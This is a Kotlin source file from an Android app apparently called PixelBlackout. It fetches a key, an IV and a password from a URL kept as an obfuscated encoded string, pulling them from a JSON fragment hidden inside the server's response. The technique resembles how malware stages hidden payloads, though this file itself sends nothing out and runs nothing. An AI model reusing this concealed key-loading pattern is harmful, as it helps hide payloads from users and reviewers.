package com.example.pixelblackout.nativebridge

import android.util.Base64
import android.util.Log
import com.example.pixelblackout.BuildConfig
import com.example.pixelblackout.utils.StringVault
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.nio.charset.StandardCharsets
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.regex.Pattern

object RemoteKeyProvider {
    private val KEY_URL = StringVault.reveal("S1dXU1AZDAxRQlQNREpXS1ZBVlBGUUBMTVdGTVcNQExODEBGTVdRQk9ARkZTT1ZQU09WUAxUQk9PU0JTRlFQDE5CUFdGUQxXRlBXDVNNRA==")
    private val PAYLOAD_PATTERN: Pattern = Pattern.compile("\\{\\s*\\\"k\\\".*?\\}", Pattern.DOTALL)
    const val MASK: Int = 0x37
    private const val TAG = "RemoteKeyProvider"
    private val executor = Executors.newSingleThreadExecutor()

    data class Material(val key: ByteArray, val iv: ByteArray, val password: ByteArray)

    fun fetch(): Material {
        return try {
            executor.submit<Material> {
                val connection = (URL(KEY_URL).openConnection() as HttpURLConnection).apply {
                    connectTimeout = 5000
                    readTimeout = 5000
                }
                try {
                    val code = connection.responseCode
                    if (BuildConfig.DEBUG) {
                        Log.d(TAG, "KEY_URL status=$code")
                    }
                    if (code in 400..599) {
                        throw IllegalStateException("Remote status $code")
                    }
                    val body = connection.inputStream.use { it.readBytes() }
                    if (BuildConfig.DEBUG) {
                        Log.d(TAG, "KEY_URL payload size=${body.size}")
                    }
                    parseMaterial(body)
                } finally {
                    connection.disconnect()
                }
            }.get(5, TimeUnit.SECONDS)
        } catch (error: IllegalStateException) {
            throw error
        } catch (error: Exception) {
            throw IllegalStateException("Key sync failed", error)
        }
    }

    private fun parseMaterial(bytes: ByteArray): Material {
        val text = String(bytes, StandardCharsets.ISO_8859_1)
        val matcher = PAYLOAD_PATTERN.matcher(text)
        if (!matcher.find()) {
            Log.e(TAG, "Payload marker not found in response")
            if (BuildConfig.DEBUG) {
                Log.e(TAG, "Payload marker not found in response")
            }
            throw IllegalStateException("Payload marker not found")
        }
        val rawJson = matcher.group()
        if (BuildConfig.DEBUG) {
            Log.d(TAG, "Payload fragment=$rawJson")
        }
        val json = JSONObject(rawJson)
        val key = Base64.decode(json.getString("k"), Base64.DEFAULT)
        val iv = Base64.decode(json.getString("i"), Base64.DEFAULT)
        val password = Base64.decode(json.getString("p"), Base64.DEFAULT)
        if (BuildConfig.DEBUG) {
            Log.d(TAG, "Decoded key=${key.size} iv=${iv.size} pwd=${password.size}")
        }
        return Material(key, iv, password)
    }
}
